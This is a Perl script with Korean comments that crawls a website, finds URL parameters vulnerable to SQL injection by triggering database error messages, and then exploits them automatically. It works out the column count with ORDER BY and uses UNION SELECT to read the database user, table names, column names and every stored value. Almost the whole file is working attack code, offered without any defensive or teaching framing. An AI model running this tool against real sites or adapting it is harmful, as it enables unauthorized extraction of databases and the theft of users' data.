#!/usr/bin/perl
use warnings;
use strict;
use threads;
use WWW::Mechanize;
use Thread::Queue;
use URI;
use 5.010;

my @urls; 
my @links;
my @form;
my %urls_done; #crawl 한 모든 utl
my %urls_keyword; #host 가 포함된 rul
my %urls_sql_form; #Form request sql weak ponit
my %urls_sql_url; #GET request sql weak point

my $content; #응답값
my $string_field; #문자열 필드

my @union_query; #필드개수 쿼리
my ($tag1, $tag2, $tag1_index, $tag2_index);
my ($auth_query, $auth_len, $auth); #계정쿼리,계정길이,계정

my ($table_query,$table_len,$table);
my @tables; #split한 $table 저장
my %table_info; #키:테이블 값:필드명인 해쉬

my ($column_query,$column_len,$column);
my @columns;
my %column_info;

my ($value_query,$value_len,$value);

my @new_column_value;
my @column_values;
my @new_column_name;

my $url = shift || "Please provide an initial source URL";
my $max_depth = shift || 1;
my $depth=0;
my $keyword = (split /:\/\//, $url)[1]; #host filter
my $mech = WWW::Mechanize->new();

eval{$mech->get($url)};
$urls_done{$url}=1;
#@form = $mech->forms; #현재 페이지의 모든 form 정보를 가져온다.
#for (@form)
#{
#	next unless $_->action =~ /$keyword/;
#	my $form_action = $_->action; #form 으로 넘겨지는 주소
#	my $form_name = $_->attr('name'); #form name 
#	my $form_method = $_->method; #form method
#	my @form_text_name; #form 안에 존재하는 text names 을 저장하는 배열 변수
#	my @inputs = $_->inputs; #form의 정보를 반환
#	for (@inputs) #type 가 text 것만 @form_text_name 배열에 저장
#	{
#		next unless $_->type eq 'text';
#		push @form_text_name, $_->name;
#	}
#	$urls_sql_form{$url} = join ' ', $form_action, $form_name, $form_method, @form_text_name; #key : url, value : form_action form_name form_method form_text_name(공백으로 구분)
#}

@links = $mech->find_all_links; #현재 페이지의 모든 링크를 가져온다.
for my $link (@links)
{
	my $url = $link->url_abs(); #링크의 절대 주소를 저장하여 배열에 삽입
	push @urls, $url;
}

my $queue = new Thread::Queue(@urls); #@urls 인자값으로 Queue 객체 생성
$queue->enqueue('--');  #맨 뒤에 -- 구분자 삽입

while($queue->pending()>0 and $max_depth>$depth)
{
	my $url = $queue->dequeue; #queue 에서 값 하나를 빼서 반환
	if ($url eq '--')
	{
		$depth++;
		$queue->enqueue('--');
		next;
	}
	next if $urls_done{$url};
	$urls_done{$url}=1;

#if($max_depth-1>$depth) #max_depth가 1일때는 if문 안의 코드를 굳이 실행할 필요가 없어서 해당 조건 생성
#	{
		eval{$mech->get($url)}; # 67~91 라인까지 24~48 라인과 동일한 구문
#		@form = $mech->forms;
#		for (@form)
#		{
#			next unless $_->action =~ /$keyword/;
#			my $form_action = $_->action;
#			my $form_name = $_->attr('name');
#			my $form_method = $_->method;
#			my @form_text_name;
#			my @inputs = $_->inputs;
#			for (@inputs)
#				{
#					next unless $_->type eq 'text';
#					push @form_text_name, $_->name;
#				}
#		$urls_sql_form{$url} = join ' ', $form_action, $form_name, $form_method, @form_text_name;
#		}
		@links = $mech->find_all_links;
		for my $link (@links)
		{
			my $url = $link->url_abs();
			next if $urls_done{$url};
			$queue->enqueue($url);
		}
#	}
}
for my $url (keys %urls_done)
{
	next unless $url =~ /$keyword/;
	$urls_keyword{$url}=1;
}

# GET repuset 에 매개변수가 존재하는 URL 필터링
for my $url (keys %urls_keyword)
{
	my $uri = URI->new($url);	
	my $query = $uri->query;
	next unless $query;
	$urls_sql_url{$url}= $query; #key : url, value : 매개변수와 값(ex: a=1&b=2)
}

# 매개변수 존재하는 URL 대상으로 GET request sql weak ponit 쿼리 작성
for my $url(keys %urls_sql_url)
{
	my $abs_url = $url;
	$abs_url =~ s/=/='TEST/g;
	
	eval{ $mech->get($abs_url) }; #수정된 url로 접근
	my $response = $mech->response; #접근한 응답객체 반환
	my $content = $response->decoded_content; #응답페이지 내용 반환
	if($content =~ /(Microsoft SQL|MySQL|ORA)/i) #응답페이지 내용에 해당 문자가 있으면)
	{
		$urls_sql_url{$url} = $1;
	}
	else #없으면
	{
		delete $urls_sql_url{$url};
	}
}

# 폼이 존재하는 URL 대상으로 Form SQL waak ponit 쿼리 작성
#for (keys %urls_sql_form)
#{
#	my $fields_query; 
#	my ($action_url, $form_name, $form_method, @form_text_name) = 
#		split ' ', $urls_sql_form{$_};
#	for (@form_text_name) #submit_form 함수에 넣을 변수 $fields_query 설정
#	{
#		$fields_query .= "$_ => \"'TEST\", ";
#	}
#	$mech->get($_);
#
#`my $response = $mech->submit_form(
#		form_name => $form_name,
#		fields =>
#		{
#			1 => 1,
#		}
#	);
#	my $content = $response->content;
#	if($content =~ /(Microsoft|MySQL|ORA)/i)
#	{
#		$urls_sql_form{$_} = $1;
#	}
#	else
#	{
#		delete $urls_sql_form{$_};
#	}
#}


#GET, Form 기반 sql weak point 출력
#for (keys %urls_sql_form)
#{
#	say "$_\n\t$urls_sql_form{$_}";
#}


for my $url (keys %urls_sql_url)
{
	my ($count, $field_number);
	my $content;
	
	say $url;
	$count=1;
	while(1)
	{
		eval{$mech->get($url.' order by '.$count)};
		$content=$mech->response->decoded_content;
		if($content=~/error/i)
		{
			$field_number=$count-1;
			last;
		}
		$count++;
		last if $count>20;
	}
	next if $count>20;
	say "\tfield number : $field_number\n\tDB name : $urls_sql_url{$url}";
	my $string_field;
	my @union_query;
	my $query='null';
	$query.=',null' x ($field_number-1);

	for (my $i=0; $i<$field_number; $i++)
	{
		my $copy_query=$query;
		substr($copy_query, $i*5, 4) = "'77777'";
		$copy_query = ' union select '.$copy_query;
		push @union_query, $copy_query;
	}
	$count=1;
	my ($tag1, $tag2, $tag1_index, $tag2_index);
	for (@union_query)
	{
		eval{$mech->get($url.$_)};
		$content=$mech->response->decoded_content;

		if($content=~/(<\/?\s*\w*\s*\w*=?"?\w*"?>)\s*77777\s*(<\/\w*>)/)
		{
			$tag1=$1;
			$tag2=$2;
			$tag1=~s/\s//g;
			$tag2=~s/\s//g;
			$string_field=$count; #문자열 필드 넘버 저장
		say "$count: 문자열 필드입니다";
	
			$content=~s/\s//g;

			$tag1_index=index($content, $tag1.'77777');
			$tag2_index=index($content, $tag2, $tag1_index);

			last;
		}
		$count++;
	}
	my ($auth_query, $auth_len, $auth);

	$auth_query=$union_query[$count-1];

	if($urls_sql_url{$url} eq 'MySQL')
	{
		$auth_query =~ s/'77777'/user\(\)/;
	}
	elsif($urls_sql_url{$url} eq 'Microsoft SQL')
	{
		$auth_query =~ s/'77777'/user_name\(\)/;
	}
	eval{$mech->get($url.$auth_query)};
	$content=$mech->response->decoded_content;
	$content=~s/\s//g;

	$tag1_index=index($content, $tag1, $tag1_index);
	$tag2_index=index($content, $tag2, $tag1_index);
	$auth_len=$tag2_index-$tag1_index-length($tag1);
	$auth=substr($content, $tag1_index+length($tag1), $auth_len);

	say "account length : $auth_len";
	say "account : $auth";


#for (keys %urls_keyword)
#{
#	say "urls_keyword : $_";
#}


my ($table_len,$table);
my $table_query=$union_query[$string_field-1]." from information_schema.tables where table_schema=database()";
$table_query=~s/'77777'/group_concat(table_name)/;

eval{$mech->get($url.$table_query)};
$content=$mech->response->decoded_content;
$content=~s/\s//g; #공백 제거
$tag1_index=index($content,$tag1,$tag1_index-1); 
$tag2_index=index($content,$tag2,$tag1_index); 
$table_len=$tag2_index-$tag1_index-length($tag1); 
$table=substr($content,$tag1_index+length($tag1),$table_len);

my @tables=split(/,/,$table);
#}

my %table_info;
my ($column_len,@columns,$column);
for my $table_name (@tables)
{
	my $column_query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
	$column_query=~s/'77777'/group_concat(column_name)/;
		
	eval{$mech->get($url.$column_query)};
	$content=$mech->response->decoded_content;
	$content=~s/\s//g; #공백 제거
	
	$tag1_index=index($content,$tag1,$tag1_index-1);
	$tag2_index=index($content,$tag2,$tag1_index);
	$column_len=$tag2_index-$tag1_index-length($tag1);
	$column=substr($content,$tag1_index+length($tag1),$column_len);

	$table_info{$table_name}=$column;
}
my ($value_query,$value_len,$value);

say "[테이블과 필드 정보]";
while( (my $key, my $value)=each %table_info) #key:테이블 $value: 칼럼 
{
	say "$key: $value";
}

my %column_info;
my @new_column_value;
my @column_values;
my @new_column_name;
while((my $table, my $column_name)=each %table_info) #key:테이블 $value: 칼럼
{	
	say "[테이블 $table]";
	@columns=split(/,/,$column_name); #,로 나눠서 배열에 저장
	for my $column_name (@columns)
	{
		my $value_query=$union_query[$string_field-1]." from $table";
		$value_query=~s/'77777'/group_concat($column_name,\'---\')/;
		eval{$mech->get($url.$value_query)};
		$content=$mech->response->decoded_content;
		$content=~s/\s//g; #공백 제거
				
		$tag1_index=index($content,$tag1,$tag1_index-1);
		if($tag1_index eq -1) { say "tag1이 뒤에있다!!!!";}
								
		$tag2_index=index($content,$tag2,$tag1_index);
		$value_len=$tag2_index-$tag1_index-length($tag1);
		$value=substr($content,$tag1_index+length($tag1),$value_len);
		if ($value =~ /</ || $value eq '')
		{
			say "$column_name에 아무런 데이터가 없음";
		}
else
		{
			$column_info{$column_name}=$value;
			push @new_column_name,$column_name;
			@column_values=split(/---,?/,$value);
			push @new_column_value,@column_values;
			push @new_column_value,"//";
		}
	}

	say "@new_column_name";
	$count=0;	
		for my $column_value(@new_column_value)
		{
			last if $column_value eq "//";
			$count++;
		}	

		for (my $i=0; $i<$count; $i++)
		{
			for (my $j=0; $j<($#new_column_name+1); $j++)
			{
				print "$new_column_value[$i+($j*($count+1))] ";		
			}		
			say '';
		}
	
	@columns=();
	%column_info=();
	@new_column_value=();
  @new_column_name=();
	say '';
}
}
